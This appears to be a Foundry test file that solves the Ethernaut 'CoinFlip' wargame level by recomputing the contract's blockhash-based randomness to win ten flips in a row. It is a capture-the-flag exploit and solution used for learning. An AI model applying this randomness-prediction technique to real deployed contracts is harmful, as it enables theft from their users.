// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.36;

import {Test} from "forge-std/Test.sol";
import {CoinFlip} from "ethernaut/contracts/src/levels/CoinFlip.sol";
import {CoinFlipFactory} from "ethernaut/contracts/src/levels/CoinFlipFactory.sol";

contract CoinFlipTest is Test {
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public immutable player = makeAddr("player");
    CoinFlipFactory public factory;
    CoinFlip public level;

    function setUp() public {
        factory = new CoinFlipFactory();
        level = CoinFlip(factory.createInstance(player));
    }

    function test_exploit_CoinFlip() public {
        assert(level.consecutiveWins() == 0);
        vm.startPrank(player);

        while (level.consecutiveWins() < 10) {
            uint256 coinFlip = uint256(blockhash(block.number - 1)) / FACTOR;
            level.flip(coinFlip == 1);
            vm.roll(block.number + 1);
        }

        vm.stopPrank();
        assert(factory.validateInstance(payable(address(level)), player));
    }
}
